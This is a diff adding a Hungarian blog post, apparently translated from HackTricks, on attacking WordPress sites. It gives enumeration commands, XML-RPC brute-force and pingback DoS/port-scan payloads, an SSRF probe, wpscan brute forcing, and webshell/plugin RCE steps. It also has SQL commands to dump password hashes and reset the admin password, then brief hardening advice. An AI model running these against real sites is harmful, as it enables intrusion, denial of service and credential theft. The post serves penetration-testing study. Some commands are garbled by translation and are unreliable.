@@ -1,0 +1,353 @@
+---
+title: "Wordpress oldalak feltörésének lehetséges módja"
+date: "2023-05-01"
+excerpt: "Alapinformációk A feltöltött fájlok ide kattintva érhetők el: http://10.10.10.10/wp-content/uploads/2018/08/a.txt A témafájlok a /wp-content/themes/ könyvtárban..."
+image: "/assets/banners/webdude-hero.webp"
+noindex: false
+---
+
+<h2>Alapinformációk</h2>
+A feltöltött fájlok ide kattintva érhetők el: http://10.10.10.10/wp-content/uploads/2018/08/a.txt
+A témafájlok a /wp-content/themes/ könyvtárban találhatók, tehát ha megváltoztatod a téma php-ját, hogy RCE-t kapj, valószínűleg ezt az elérési utat fogod használni. Például: A huszonkettedik téma használatával elérheti a 404.php fájlt a következő helyen: /wp-content/themes/twentytwelve/404.php
+
+Egy másik hasznos URL lehet: /wp-content/themes/default/404.php
+
+A wp-config.php fájlban megtalálhatja az adatbázis root jelszavát.
+Alapértelmezett bejelentkezési útvonalak az ellenőrzéshez: /wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/
+<h2>Fő WordPress fájlok</h2>
+* index.php
+* A licenc.txt hasznos információkat tartalmaz, például a WordPress telepített verzióját.
+* A wp-activate.php az e-mail-aktiválási folyamathoz használatos új WordPress-webhely beállításakor.
+* Bejelentkezési mappák (átnevezhető, hogy elrejtse):
+  * /wp-admin/login.php
+  * /wp-admin/wp-login.php
+  * /login.php
+  * /wp-login.php
+* Az xmlrpc.php egy olyan fájl, amely a WordPress egy olyan funkcióját képviseli, amely lehetővé teszi az adatok továbbítását HTTP-vel, mint átviteli mechanizmussal, és XML-lel mint kódoló mechanizmussal. Ezt a típusú kommunikációt a WordPress REST API váltotta fel.
+* A wp-content mappa a fő könyvtár, ahol a bővítmények és a témák tárolódnak.
+* wp-content/uploads/ Az a könyvtár, ahol a platformra feltöltött fájlokat tárolják.
+* wp-includes/ Ez az a könyvtár, ahol az alapvető fájlok, például tanúsítványok, betűtípusok, JavaScript-fájlok és widgetek tárolódnak.
+<h3>Post exploitation</h3>
+A wp-config.php fájl tartalmazza a WordPress által az adatbázishoz való csatlakozáshoz szükséges információkat, például az adatbázis nevét, az adatbázis gazdagépét, a felhasználónevet és a jelszót, a hitelesítési kulcsokat és sókat, valamint az adatbázistábla előtagját. Ez a konfigurációs fájl a DEBUG mód aktiválására is használható, ami hasznos lehet a hibaelhárításban.
+<h2>Felhasználói engedélyek</h2>
+* Adminisztrátor
+* Szerkesztő: Saját és mások bejegyzéseinek közzététele és kezelése
+* Szerző: Saját bejegyzések közzététele és kezelése
+* Közreműködő: Írja és kezelje bejegyzéseit, de nem teheti közzé azokat
+* Feliratkozó: Böngésző bejegyzéseket tesz közzé és profilját szerkesztheti
+<h3>Passzív felsorolás</h3>
+<strong>Szerezze be a WordPress verziót</strong>
+
+Ellenőrizze, hogy megtalálja-e a /license.txt vagy a /readme.html fájlokat
+
+Az oldal forráskódjában (példa: https://wordpress.org/support/article/pages/):
+* grep
+
+```bash
+curl https://victim.com/ | grep 'content="WordPress'
+```
+
+* meta név
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image.png" alt="" width="531" height="50" />
+* CSS link fájlok
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image1.png" alt="" width="988" height="33" />
+* JavaScript fájlok
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image2.png" alt="" width="1055" height="119" />
+<h4>Beépülő modulok beszerzése</h4>
+
+```bash
+curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
+```
+
+<h4>Témák beszerzése</h4>
+
+```bash
+curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-tartalom/témák' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
+```
+
+<h4>Kivonat változatok általában</h4>
+
+```bash
+curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
+```
+
+ATrickest segítségével könnyedén készíthet és automatizálhat munkafolyamatokat a világ legfejlettebb közösségi eszközeivel.
+<h2>Aktív felsorolás</h2>
+<h3>Beépülő modulok és témák</h3>
+Valószínűleg nem fogja megtalálni az összes beépülő modult és témát elfogadhatónak. Ahhoz, hogy mindegyiket felfedezhesse, aktívan ki kell dolgoznia a Brute Force beépülő modulok és témák listáját (remélhetőleg léteznek olyan automatizált eszközök, amelyek ezeket a listákat tartalmazzák).
+<h3>Felhasználók</h3>
+<h4>ID Brute</h4>
+Érvényes felhasználókat kap egy WordPress webhelyről a Brute Forcing felhasználói azonosítókkal:
+
+```bash
+curl -s -I -X ELÉRHETŐ http://blog.example.com/?author=1
+```
+
+Ha a válaszok 200 vagy 30X, az azt jelenti, hogy az azonosító érvényes. Ha a válasz 400, akkor az azonosító érvénytelen.
+<h4>wp-json</h4>
+Megpróbálhat információt szerezni a felhasználókról a következő lekérdezéssel is:
+
+```bash
+curl http://blog.example.com/wp-json/wp/v2/users
+```
+
+<strong>Csak azokról a felhasználókról adunk információkat, akiknél ez a funkció engedélyezve van.</strong>
+
+Vegye figyelembe azt is, hogy a /wp-json/wp/v2/pages IP-címek kiszivároghatnak.
+
+<strong>Bejelentkezés felhasználónév felsorolása</strong>
+
+Amikor bejelentkezik a /wp-login.php fájlba, az üzenet eltérő attól, hogy a jelzett felhasználónév létezik-e vagy sem.
+<h4>XML-RPC</h4>
+Ha az xml-rpc.php aktív, végrehajthatja a hitelesítő adatok brute-force-ját, vagy használhatja DoS-támadások indítására más erőforrások ellen. (Ezt a folyamatot például ezzel automatizálhatja).
+
+Annak ellenőrzéséhez, hogy aktív-e, próbálja meg elérni az /xmlrpc.php fájlt, és küldje el ezt a kérést:
+<h4>Check</h4>
+
+```xml
+<methodCall>
+<methodName>system.listMethods</methodName>
+
+</params>
+</methodCall>
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/list-of-functions.png" alt="" width="655" height="296" />
+```
+
+<h4>Bruteforce hitelesítő adatai</h4>
+<strong>wp.getUserBlogs</strong>, vagy néhány olyan módszer, amellyel a hitelesítő adatok nyers erővel kényszeríthetők ki. Ha megtalálod valamelyiket, küldhetsz valami ilyesmit:<strong>wp.getCategoriesmetaWeblog.getUsersBlogs</strong>
+
+```xml
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+
+<value>admin</value></param>
+
+<value>pass</value></param>
+</params>
+</methodCall>
+```
+
+Ha a hitelesítési adatok nem érvényesek, a 200-as kód válaszában a "Helytelen felhasználónév vagy jelszó" üzenetnek kell megjelennie.
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/spaces.png" alt="" width="768" height="301" /> <img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image3.png" alt="" width="768" height="329" />
+
+A megfelelő hitelesítő adatok használatával feltölthet egy fájlt. A válaszban megjelenik az elérési út ( https://gist.github.com/georgestephanis/5681982 )
+
+```xml
+<?xml version='1.0' encoding='utf-8'?>
+<methodCall>
+<methodName>wp.uploadFile</methodName>
+
+<value><string>1</string></value></param>
+
+<value><string>username</string></value></param>
+
+<value><string>password</string></value></param>
+
+<value>
+<struct>
+<member>
+<name>name</name>
+<value><string>filename.jpg</string></value>
+</member>
+<member>
+<name>type</name>
+<value><string>mime/type</string></value>
+</member>
+<member>
+<name>bits</name>
+<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
+</member>
+</struct>
+</value>
+</param>
+</params>
+</methodCall>
+```
+
+Ezenkívül van egy <strong>gyorsabb módja</strong> a hitelesítő adatok brutális erőltetésének, mivel több hitelesítési adatot is kipróbálhat ugyanabban a kérésben:<strong>system.multicall</strong>
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image3-1.png" alt="" width="768" height="329" />
+<h4>Bypass 2FA</h4>
+Ez a módszer programokhoz és nem emberekhez készült, és régi, ezért nem támogatja a 2FA-t. Tehát, ha érvényes cred-eid vannak, de a főbejáratot 2FA védi, előfordulhat, hogy visszaélhetsz az xmlrpc.php-vel, hogy a 2FA-t megkerülve jelentkezz be . Vegye figyelembe, hogy nem fog tudni végrehajtani minden olyan műveletet, amelyet a konzolon keresztül megtehet, de előfordulhat, hogy továbbra is elérheti az RCE-t, ahogy az Ippsec elmagyarázza: https://www.youtube.com/watch?v=p8mIdm93mfw&amp;t=1130s
+<h4>DDoS vagy port szkennelés</h4>
+Ha megtalálja a pingback.ping metódust a listában, akkor a Wordpress tetszőleges kérést küldhet bármely gazdagépre/portra.
+
+Ezzel több ezer Wordpress webhelyet kérhet meg egy hely elérésére ( tehát az adott helyen DDoS keletkezik), vagy arra is használhatja, hogy a Wordpress megvizsgáljon valamilyen belső hálózatot (bármelyik portot jelezhet).
+
+```xml
+<methodCall>
+<methodName>pingback.ping</methodName>
+
+<value><string>http://<YOUR SERVER >:
+</string></value>
+</param>
+<value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
+</value></param></params>
+</methodCall>
+```
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/ggggg.png" alt="" width="1311" height="723" />
+
+Ha a <strong>faultCode</strong> értéke <strong>nagyobb</strong> , mint 0 (17), az azt jelenti, hogy a port nyitva van.
+
+Vessen egy pillantást a használatára az előző részben, hogy megtudja, hogyan lehet visszaélni ezzel a módszerrel DDoS előidézésére <strong>.system.multicall</strong>
+<h4>DOS</h4>
+
+```xml
+<methodCall>
+<methodName>pingback.ping</methodName>
+
+<value><string>http://target/</string></value></param>
+
+<value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
+</params>
+</methodCall>
+```
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image5.png" alt="" width="768" height="275" />
+<h4>wp-cron.php DoS</h4>
+Ez a fájl általában a Wordpress webhely gyökérkönyvtárában található: A fájl elérésekor " súlyos " <strong>MySQL - lekérdezést hajtanak végre, így a támadók használhatják DoS - t . </strong>
+
+Ezenkívül alapértelmezés szerint minden oldalbetöltéskor meghívódik (bármikor, amikor egy ügyfél bármilyen Wordpress-oldalt kér), ami a nagy forgalmú webhelyeken problémákat okozhat (DoS). <strong>/wp-cron.phpwp-cron.php</strong>
+
+Javasoljuk, hogy tiltsa le a <strong>Wp-Cront</strong>, és hozzon létre egy valódi cronjobot a gazdagépen belül, amely szabályos időközönként elvégzi a szükséges műveleteket (problémák nélkül).
+<h4>/wp-json/oembed/1.0/proxy - SSRF</h4>
+Próbálja meg elérni a <a href="https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net">https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net</a> oldalt, és a Worpress webhely kérést intézhet Önhöz.
+
+Ez a válasz, ha nem működik:
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image6.png" alt="" width="626" height="121" />
+<h4>SSRF</h4>
+https://github.com/t0gu/quickpress/blob/master/core/requests.go
+
+Ez az eszköz ellenőrzi, hogy a <strong>methodName: pingback.ping</strong> és a<strong> /wp-json/oembed/1.0/proxy</strong> elérési útja van-e, és ha létezik, megpróbálja kihasználni őket.
+<h4>Automatic ToolsAutomatic Tools</h4>
+
+```bash
+cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
+wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
+#You can try to bruteforce the admin user using wpscan with "-U admin"
+```
+
+<h4>Hozzáférést kaphat egy kicsit felülírva</h4>
+Ez több mint egy igazi támadás érdekesség. A https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man CTF-ben 1 bitet fordíthat bármelyik wordpress fájlból. Így átfordíthatja a 5389 fájl pozícióját<strong> /var/www/html/wp-includes/user.php ne csináld ( !)</strong> műveletre.
+
+```php
+if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
+return new WP_Error(
+```
+
+<h4>RCE panel</h4>
+php módosítása a használt témából (adminisztrátori hitelesítő adatok szükségesek)
+
+Megjelenés → Témaszerkesztő → 404-es sablon (jobb oldalon)
+
+A php shell tartalmának módosítása:
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image7.png" alt="" width="933" height="768" />
+
+Keresse meg az interneten, hogyan érheti el a frissített oldalt. Ebben az esetben itt kell elérnie:
+
+> http://10.11.1.234/wp-content/themes/twentytwelve/404.phphttp://10.11.1.234/wp-content/themes/twentytwelve/404.php
+
+<h4>MSF</h4>
+Te tudod használni:
+
+> use exploit/unix/webapp/wp_admin_shell_upload
+
+munkamenetet szerezni.
+<h3>RCE beépülő modul</h3>
+<h4>PHP bővítmény</h4>
+Lehetséges .php fájlok feltöltése pluginként.
+
+Hozd létre a php hátsó ajtódat, például:
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image8.png" alt="" width="599" height="49" />
+
+Ezután adjon hozzá egy új bővítményt:
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image9.png" alt="" width="405" height="275" />
+
+Töltse fel a bővítményt, és nyomja meg a Telepítés gombot:
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image10-1.png" alt="" width="1275" height="366" />
+
+Kattintson a Tovább gombra:
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image11.png" alt="" width="485" height="406" />
+
+Valószínűleg ez nem csinál semmit, de ha a Média oldalra lép, látni fogja, hogy a shell feltöltve van:
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image12.png" alt="" width="513" height="382" />
+
+Nyissa meg, és látni fogja az URL-t a fordított shell végrehajtásához:
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image13.png" alt="" width="838" height="462" />
+<h4>Rosszindulatú bővítmény feltöltése és aktiválása</h4>
+(Ez a rész a https://www.hackingarticles.in/wordpress-reverse-shell/ oldalról van fordítva )
+
+Egyes bejelentkezési felhasználók nem rendelkeznek írási jogosultsággal a WordPress téma módosítására, ezért a webshell megszerzésének alternatív stratégiájaként a „WP pulgin rosszindulatú beszúrása” lehetőséget választjuk.
+
+Tehát, miután hozzáfér a WordPress irányítópultjához, megpróbálhat rosszindulatú beépülő modult telepíteni. Itt már letöltöttem a sebezhető bővítményt az exploit db-ból.
+
+Kattintson ide a plugin letöltéséhez a gyakorlathoz.
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/10.png" alt="" width="753" height="494" />
+
+Mivel van egy zip fájlunk a bővítményhez, és itt az ideje feltölteni a bővítményt.
+
+Irányítópult &gt; beépülő modulok &gt; plugin feltöltése
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/11.png" alt="" width="674" height="327" />
+
+Böngésszen a letöltött zip fájlban az ábra szerint.
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image10-2.png" alt="" width="1275" height="366" />
+
+A csomag sikeres telepítése után aktiválnunk kell a bővítményt.
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/13.png" alt="" width="614" height="306" />
+
+Ha minden jól van beállítva, akkor menjen a kihasználáshoz. Mivel telepítettük a „reflex-gallery” nevű sebezhető bővítményt, és könnyen kihasználható.
+
+A sérülékenység kihasználását a Metasploit keretrendszeren belül kapja meg, így betölti az alábbi modult, és végrehajtja a következő parancsot:
+
+Amint a fenti parancsok végrehajtásra kerülnek, megtörténik a meterpreter munkamenet. Ahogy ebben a cikkben is bemutatjuk, számos módszer létezik a WordPress platformon alapuló webhelyek kihasználására.
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/image10-3.png" alt="" width="1275" height="366" />
+<h3>Post Exploitation</h3>
+Felhasználónevek és jelszavak kibontása:
+
+```sql
+mysql -u <USERNAME> --password=
+ -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
+```
+
+Adminisztrátori jelszó módosítása:
+
+```sql
+mysql -u <USERNAME> --password=
+ -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
+```
+
+<h2>WordPress védelem</h2>
+<h4>Rendszeres frissítések</h4>
+Győződjön meg arról, hogy a WordPress, a bővítmények és a témák naprakészek. Győződjön meg arról is, hogy az automatikus frissítés engedélyezve van a wp-config.php fájlban:
+
+```php
+define( 'WP_AUTO_UPDATE_CORE', true );
+add_filter( 'auto_update_plugin', '__return_true' );
+add_filter( 'auto_update_theme', '__return_true' );
+```
+
+Ezenkívül csak megbízható WordPress-bővítményeket és -témákat telepítsen .
+Biztonsági beépülő modulok
+<h3>Egyéb ajánlások</h3>
+* Az alapértelmezett adminisztrátor eltávolítása
+* Használjon erős jelszavakat és 2FA-t
+* Rendszeresen ellenőrizze a felhasználói engedélyeket
+* Korlátozza a bejelentkezési kísérleteket, hogy megakadályozza a Brute Force támadásokat
+* Nevezze át a fájlt, és csak belsőleg vagy bizonyos IP-címekről engedélyezze a hozzáférést.wp-admin.php
+Forrás: hacktricks (https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)
